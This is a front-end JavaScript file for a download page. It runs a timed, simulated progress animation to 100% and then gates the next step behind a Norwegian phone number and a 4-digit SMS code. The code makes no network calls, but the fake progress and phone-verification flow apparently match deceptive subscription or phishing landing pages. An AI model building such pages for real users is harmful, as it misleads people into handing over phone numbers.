// Custom Scripts
const loading = document.querySelector(".loader-block");
const downloadBlock = document.querySelector(".download-block");
document.addEventListener("DOMContentLoaded", () => {
  setTimeout(function () {
    loading.style.display = "none";
    downloadBlock.style.display = "flex";

    let percent = 1;
    const circleProgress = document.querySelector(".progress");
    const downloadArrow = document.querySelector(".download__circle--arrow");
    const percentDisplay = document.querySelector(".download__circle--percent");
    const circumference = 2 * Math.PI * 28;

    const animation = setInterval(() => {
      percent++;
      const offset = circumference - (circumference / 100) * percent;
      circleProgress.style.strokeDashoffset = offset;
      percentDisplay.textContent = `${percent}%`;

      if (percent === 100) {
        clearInterval(animation);
        circleProgress.style.strokeDasharray = 176;
        setTimeout(function () {
          percentDisplay.style.display = "none";
          downloadArrow.style.display = "flex";
        }, 400);
      }
    }, 10);
  }, 1200);
});
const element = document.getElementById("phone");
const maskOptions = {
  mask: "+{47} 000 00 000",
};
const mask = IMask(element, maskOptions);

const phoneInput = document.getElementById("phone");
const continueButton = document.querySelector(".download__btn");
const errorBlock = document.createElement("div");
errorBlock.className = "download__input-error";
const smsInput = document.getElementById("sms");
const smsButton = document.querySelector(".download__btn-sms");
const lineSecond = document.querySelector(".download__status--line-second");

smsInput.addEventListener("input", () => {
  const smsCode = smsInput.value.trim();
  const isValidSms = smsCode.length === 4 && /^\d+$/.test(smsCode); // Проверка на 4 цифры

  smsButton.disabled = !isValidSms;
});
phoneInput.addEventListener("input", () => {
  const phoneNumber = phoneInput.value.trim();
  const isValid = validatePhoneNumber(phoneNumber);
  if (!isValid) {
    if (!document.querySelector(".download__input-error")) {
      errorBlock.textContent = "Invalid phone number.";
      document.querySelector(".download__input-block").appendChild(errorBlock);
    }
    continueButton.classList.remove("download__input-ready"); // Удаляем класс, если номер невалиден
    continueButton.disabled = true;
  } else {
    if (document.querySelector(".download__input-error")) {
      document.querySelector(".download__input-error").remove();
    }
    continueButton.classList.add("download__input-ready"); // Добавляем класс, если номер валиден
    continueButton.disabled = false;
  }
});

function validatePhoneNumber(number) {
  number = number.replace(/[^+\d]/g, "");
  return number.startsWith("+47") && number.length >= 10;
}
const inputBlock = document.querySelector(".download__input-block");
const verifyBlock = document.querySelector(".download__verify");
const smsBlock = document.querySelector(".download__sms-block");
const stepText = document.querySelector(".download__status--step");
continueButton.addEventListener("click", () => {
  inputBlock.style.display = "none";
  verifyBlock.style.display = "flex";
  setTimeout(function () {
    verifyBlock.style.display = "none";
    smsBlock.style.display = "flex";
    lineSecond.classList.add("active-line");
    stepText.innerHTML = "STEP 2/2";
  }, 3000);
});

